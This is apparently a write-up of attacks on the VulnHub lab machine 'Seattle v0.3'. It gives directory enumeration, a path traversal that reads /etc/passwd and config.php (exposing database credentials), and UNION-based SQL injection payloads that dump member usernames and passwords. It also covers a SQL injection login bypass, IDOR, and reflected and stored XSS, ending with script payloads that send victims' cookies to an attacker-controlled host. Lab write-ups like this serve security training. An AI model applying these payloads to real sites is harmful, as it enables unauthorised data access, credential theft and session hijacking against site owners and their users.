## Seattle v0.3

https://www.vulnhub.com/entry/seattle-v03,145/

Directory enumeration:
```
/products.php         (Status: 200) [Size: 1775]
/downloads            (Status: 301) [Size: 239] [--> http://192.168.1.131/downloads/]
/terms.php            (Status: 200) [Size: 13019]
/blog.php             (Status: 200) [Size: 2031]
/login.php            (Status: 302) [Size: 0] [--> /account.php?login=user]
/nav.php              (Status: 200) [Size: 386]
/header.php           (Status: 200) [Size: 876]
/admin                (Status: 301) [Size: 235] [--> http://192.168.1.131/admin/]
/footer.php           (Status: 200) [Size: 807]
/account.php          (Status: 200) [Size: 2326]
/info.php             (Status: 200) [Size: 82581]
/about.php            (Status: 200) [Size: 2423]
/details.php          (Status: 200) [Size: 1150]
/display.php          (Status: 200) [Size: 86]
/manual               (Status: 301) [Size: 236] [--> http://192.168.1.131/manual/]
/images               (Status: 301) [Size: 236] [--> http://192.168.1.131/images/]
/front.php            (Status: 200) [Size: 212]
/index.php            (Status: 200) [Size: 1892]
/theme                (Status: 301) [Size: 235] [--> http://192.168.1.131/theme/]
/download.php         (Status: 200) [Size: 41]
/logout.php           (Status: 302) [Size: 0] [--> /account.php]
/config.php           (Status: 200) [Size: 0]
/getfile.php          (Status: 200) [Size: 41]
/connection.php       (Status: 200) [Size: 0]
/level.php            (Status: 302) [Size: 0] [--> /index.php]
/user-details.php     (Status: 200) [Size: 640]
```

There is an exposed phpinfo at `info.php`.

There is a path traversal at `/download.php?item=../../../../etc/passwd`.

We can read the enumerated files before, config.php is an insteresting one: `../config.php`
```
$user = 'root';
$pass = 'Alexis*94';
$database = 'seattle';
```

This is the code vulnerable to LFI:
```php
$fullPath = $path.$_GET['item'];

if ($fd = fopen ($fullPath, "r")) {
    $fsize = filesize($fullPath);
    $path_parts = pathinfo($fullPath);
    $ext = strtolower($path_parts["extension"]);
    switch ($ext) {
        case "pdf":
        header("Content-type: application/pdf");
        header("Content-Disposition: attachment; filename=\"".$path_parts["basename"]."\""); // use 'attachment' to force a file download
        break;
        // add more headers for other content types here
        default;
        header("Content-type: application/octet-stream");
        header("Content-Disposition: filename=\"".$path_parts["basename"]."\"");
        break;
    }
    header("Content-length: $fsize");
    header("Cache-control: private"); //use this to open files directly
    while(!feof($fd)) {
        $buffer = fread($fd, 2048);
        echo $buffer;
    }
}
fclose ($fd);
```

<br>

#### SQL Injection
An DB Error occurs at `/products.php?type=1'` when inserting quotation mark.
```
DB Error, could not query the database
MySQL Error: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1
```

We find the columns count with: `1+ORDER+BY+5--`.

Third columns is being reflected as Product Name: `0+UNION+SELECT+NULL,NULL,'threeC',NULL,NULL--`

Enumerating and dumping credentials:
```
0+UNION+SELECT+NULL,NULL,@@version,NULL,NULL--
10.0.23-MariaDB

# Retrieve tables to find table 'user'
0+UNION+SELECT+NULL,NULL,TABLE_NAME,NULL,NULL+FROM+information_schema.tables--

# Discovering columns to find 'user' and 'password'
0 UNION SELECT NULL,NULL,COLUMN_NAME,NULL,NULL FROM information_schema.columns WHERE table_name = 'user'--

# Discovering columns to find 'username' and 'password'
0 UNION SELECT NULL,NULL,COLUMN_NAME,NULL,NULL FROM information_schema.columns WHERE table_name = 'tblMembers'--

# Dump info
0+UNION+SELECT+NULL,NULL,username,NULL,NULL+FROM+tblMembers--

# Concatenate to bring pretty information
0+UNION+SELECT+NULL,NULL,CONCAT(username,'+',password),NULL,NULL+FROM+tblMembers--
```

`details.php` is also vulnerable, third and fifth columns are reflected. Other way to enumerate:
```
details.php?prod=-1 and 1=1 union all select 1,2,3,4,5 --

# Enumerate database name
details.php?prod=-1 and 1=1 union all select 1,2,3,4,database() --

# Enumerate tables
details.php?prod=-1 and 1=1 union all select 1,2,3,4,group_concat(table_name) from information_schema.tables where table_schema=database() --

# Enumerate columns
prod=-1 and 1=1 union all select 1,2,3,4,group_concat(column_name) from information_schema.columns where table_name='tblMembers' --

# Dump info
-1 and 1=1 union all select 1,2,3,4,group_concat(username,CHAR(32),password) from tblMembers --
```

These are the vulnerable queries:
```php
# display.php (products.php)
$sql = 'SELECT * FROM tblProducts WHERE type =' . $type;

# prod-details.php (details.php)
$sql = 'SELECT * FROM tblProducts WHERE id = ' . $prod;
```

<br>

#### Login
You can bypass login with `usermail=test%40gmail.com'+OR+1=1-- &password=test`.

There is also a username enumeration at login, you can validate the difference on response with admin@seattlesounds.net.

You can perform IDOR in http://192.168.1.131/blog.php?author=1 to see other author's blog and enumerate their usernames.

<br>

#### XSS
Reflected XSS in `/blog.php?author="><script>alert(1)</script>`.

Stored Cross-Site Scripting creating a new blog an acessing at `/blog.php?author=1`.

You can get XSS cookie by using this payload and js file:
```js
<script src="http://192.168.1.125/xss.js"></script>

var exfilreq = new XMLHttpRequest();    
exfilreq.open("GET", "http://192.168.1.125/" + document.cookie, false);    
exfilreq.send();

# Or just use
<script>var i=new Image;i.src="http://192.168.1.125/xss.php?"+document.cookie;</script>
```

cookieStealer.py automates this process.
